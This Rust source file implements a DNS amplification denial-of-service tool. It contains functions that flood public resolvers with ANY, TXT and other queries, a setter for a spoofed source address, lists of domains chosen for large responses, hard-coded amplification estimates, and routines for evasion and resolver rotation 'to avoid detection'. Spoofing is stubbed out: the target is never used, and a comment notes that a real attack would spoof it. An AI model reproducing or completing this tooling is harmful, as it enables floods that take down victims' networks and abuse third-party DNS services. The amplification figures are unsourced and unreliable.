use anyhow::Result;
use rand::Rng;
use std::net::{IpAddr, SocketAddr, UdpSocket};
use std::time::Duration;
use tokio::net::UdpSocket as TokioUdpSocket;

pub struct DnsAmplification {
    resolvers: Vec<IpAddr>,
    query_types: Vec<DnsQueryType>,
    spoofed_source: Option<IpAddr>,
}

#[derive(Clone)]
pub enum DnsQueryType {
    A,      // IPv4 address
    AAAA,   // IPv6 address  
    MX,     // Mail exchange
    TXT,    // Text records
    ANY,    // All records (highest amplification)
    NS,     // Name server
    SOA,    // Start of authority
    CNAME,  // Canonical name
}

impl DnsAmplification {
    pub fn new() -> Self {
        Self {
            resolvers: Self::load_public_resolvers(),
            query_types: vec![
                DnsQueryType::ANY,  // Highest amplification factor
                DnsQueryType::TXT,
                DnsQueryType::MX,
                DnsQueryType::A,
                DnsQueryType::AAAA,
                DnsQueryType::NS,
                DnsQueryType::SOA,
                DnsQueryType::CNAME,
            ],
            spoofed_source: None,
        }
    }

    fn load_public_resolvers() -> Vec<IpAddr> {
        vec![
            "8.8.8.8".parse().unwrap(),           // Google DNS
            "8.8.4.4".parse().unwrap(),           // Google DNS
            "1.1.1.1".parse().unwrap(),           // Cloudflare DNS
            "1.0.0.1".parse().unwrap(),           // Cloudflare DNS
            "208.67.222.222".parse().unwrap(),    // OpenDNS
            "208.67.220.220".parse().unwrap(),    // OpenDNS
            "9.9.9.9".parse().unwrap(),           // Quad9 DNS
            "149.112.112.112".parse().unwrap(),   // Quad9 DNS
            "64.6.64.6".parse().unwrap(),         // Verisign DNS
            "64.6.65.6".parse().unwrap(),         // Verisign DNS
        ]
    }

    // Set spoofed source IP for amplification
    pub fn set_spoofed_source(&mut self, source_ip: IpAddr) {
        self.spoofed_source = Some(source_ip);
    }

    // Create DNS query packet
    fn create_dns_query(&self, domain: &str, query_type: &DnsQueryType) -> Vec<u8> {
        let mut packet = Vec::new();
        
        // DNS Header (12 bytes)
        let transaction_id: u16 = rand::thread_rng().gen();
        packet.extend_from_slice(&transaction_id.to_be_bytes());
        
        // Flags: Standard query with recursion desired
        packet.extend_from_slice(&[0x01, 0x00]);
        
        // Questions: 1, Answer RRs: 0, Authority RRs: 0, Additional RRs: 0
        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        
        // Question section
        for part in domain.split('.') {
            packet.push(part.len() as u8);
            packet.extend_from_slice(part.as_bytes());
        }
        packet.push(0x00); // End of domain name
        
        // Query type
        let qtype: u16 = match query_type {
            DnsQueryType::A => 0x0001,
            DnsQueryType::AAAA => 0x001C,
            DnsQueryType::MX => 0x000F,
            DnsQueryType::TXT => 0x0010,
            DnsQueryType::ANY => 0x00FF,
            DnsQueryType::NS => 0x0002,
            DnsQueryType::SOA => 0x0006,
            DnsQueryType::CNAME => 0x0005,
        };
        packet.extend_from_slice(&qtype.to_be_bytes());
        
        // Query class (IN = Internet)
        packet.extend_from_slice(&[0x00, 0x01]);
        
        packet
    }

    // Launch DNS amplification attack
    pub async fn launch_attack(
        &self,
        target: IpAddr,
        domain: &str,
        threads: u32,
        rate: u64,
        duration: Duration,
    ) -> Result<()> {
        log::info!("Starting DNS amplification attack on {}", target);
        log::info!("Using {} threads, {} queries/sec for {:?}", threads, rate, duration);
        
        let mut handles = Vec::new();
        let end_time = std::time::Instant::now() + duration;
        
        for thread_id in 0..threads {
            let resolvers = self.resolvers.clone();
            let query_types = self.query_types.clone();
            let domain = domain.to_string();
            let spoofed_source = self.spoofed_source.unwrap_or(target);
            
            let handle = tokio::spawn(async move {
                Self::attack_worker(
                    thread_id as usize,
                    resolvers,
                    query_types,
                    spoofed_source,
                    domain,
                    rate,
                    end_time,
                ).await
            });
            
            handles.push(handle);
        }
        
        // Wait for all threads to complete
        for handle in handles {
            handle.await?;
        }
        
        log::info!("DNS amplification attack completed");
        Ok(())
    }

    async fn attack_worker(
        thread_id: usize,
        resolvers: Vec<IpAddr>,
        query_types: Vec<DnsQueryType>,
        _target: IpAddr,
        domain: String,
        rate: u64,
        end_time: std::time::Instant,
    ) {
        use rand::prelude::*;
        
        let delay = Duration::from_millis(1000 / rate);
        let socket = match UdpSocket::bind("0.0.0.0:0") {
            Ok(s) => s,
            Err(e) => {
                log::error!("Thread {}: Failed to bind socket: {}", thread_id, e);
                return;
            }
        };
        
        let mut query_count = 0;
        
        while std::time::Instant::now() < end_time {
            // Use thread-local random generation in each iteration
            let resolver_idx = {
                let mut rng = rand::thread_rng();
                rng.gen_range(0..resolvers.len())
            };
            let query_type_idx = {
                let mut rng = rand::thread_rng();
                rng.gen_range(0..query_types.len())
            };
            
            let resolver = &resolvers[resolver_idx];
            let query_type = &query_types[query_type_idx];
            
            // Create DNS query
            let amplifier = DnsAmplification::new();
            let query_packet = amplifier.create_dns_query(&domain, query_type);
            
            // Send to resolver (in real attack, this would be spoofed)
            let resolver_addr = SocketAddr::new(*resolver, 53);
            if let Err(e) = socket.send_to(&query_packet, resolver_addr) {
                log::debug!("Thread {}: Failed to send query: {}", thread_id, e);
            } else {
                query_count += 1;
                if query_count % 100 == 0 {
                    log::debug!("Thread {}: Sent {} queries", thread_id, query_count);
                }
            }
            
            tokio::time::sleep(delay).await;
        }
        
        log::info!("Thread {}: Completed with {} queries sent", thread_id, query_count);
    }

    // Calculate amplification factor for different query types
    pub fn get_amplification_factor(&self, query_type: &DnsQueryType) -> f32 {
        match query_type {
            DnsQueryType::ANY => 70.0,    // Up to 70x amplification
            DnsQueryType::TXT => 50.0,    // Up to 50x amplification
            DnsQueryType::MX => 25.0,     // Up to 25x amplification
            DnsQueryType::AAAA => 10.0,   // Up to 10x amplification
            DnsQueryType::A => 5.0,       // Up to 5x amplification
            DnsQueryType::NS => 15.0,     // Up to 15x amplification
            DnsQueryType::SOA => 20.0,    // Up to 20x amplification
            DnsQueryType::CNAME => 8.0,   // Up to 8x amplification
        }
    }

    // Find domains with high amplification potential
    pub fn find_amplification_domains(&self) -> Vec<String> {
        vec![
            // Domains known to have large TXT records
            "google.com".to_string(),
            "facebook.com".to_string(),
            "microsoft.com".to_string(),
            "amazon.com".to_string(),
            
            // Domains with many subdomains (high ANY response)
            "github.com".to_string(),
            "stackoverflow.com".to_string(),
            "wikipedia.org".to_string(),
            
            // DNS root servers (very large responses)
            ".".to_string(),  // Root zone
        ]
    }

    // Test resolver for amplification potential
    pub async fn test_resolver(&self, resolver: IpAddr, domain: &str) -> Result<f32> {
        let socket = TokioUdpSocket::bind("0.0.0.0:0").await?;
        
        // Test with ANY query (highest amplification)
        let query = self.create_dns_query(domain, &DnsQueryType::ANY);
        let resolver_addr = SocketAddr::new(resolver, 53);
        
        socket.send_to(&query, resolver_addr).await?;
        
        let mut buffer = [0u8; 4096];
        match tokio::time::timeout(Duration::from_secs(2), socket.recv(&mut buffer)).await {
            Ok(Ok(response_size)) => {
                let amplification_factor = response_size as f32 / query.len() as f32;
                Ok(amplification_factor)
            },
            _ => Ok(0.0), // Timeout or error
        }
    }

    // Get optimal query type for maximum amplification
    pub fn get_optimal_query_type(&self, domain: &str) -> DnsQueryType {
        // Different domains have different optimal query types
        if domain.ends_with(".com") || domain.ends_with(".org") {
            DnsQueryType::TXT  // Usually have SPF records
        } else if domain == "." {
            DnsQueryType::NS   // Root zone NS records
        } else {
            DnsQueryType::ANY  // Generic high amplification
        }
    }

    // Create randomized domain list for evasion
    pub fn generate_random_domains(&self, count: usize) -> Vec<String> {
        let mut domains = Vec::new();
        let mut rng = rand::thread_rng();
        
        let tlds = [".com", ".org", ".net", ".info", ".biz", ".co"];
        let prefixes = ["www", "mail", "ftp", "test", "dev", "api"];
        
        for _ in 0..count {
            let prefix = prefixes[rng.gen_range(0..prefixes.len())];
            let name: String = (0..rng.gen_range(5..12))
                .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
                .collect();
            let tld = tlds[rng.gen_range(0..tlds.len())];
            
            domains.push(format!("{}.{}{}", prefix, name.to_lowercase(), tld));
        }
        
        domains
    }

    // Monitor and rotate resolvers to avoid detection
    pub async fn rotate_resolvers(&mut self) {
        let mut active_resolvers = Vec::new();
        
        for resolver in &self.resolvers {
            // Test if resolver is still responsive
            if let Ok(factor) = self.test_resolver(*resolver, "google.com").await {
                if factor > 1.0 {
                    active_resolvers.push(*resolver);
                }
            }
        }
        
        if !active_resolvers.is_empty() {
            self.resolvers = active_resolvers;
            log::info!("Rotated to {} active resolvers", self.resolvers.len());
        }
    }
}
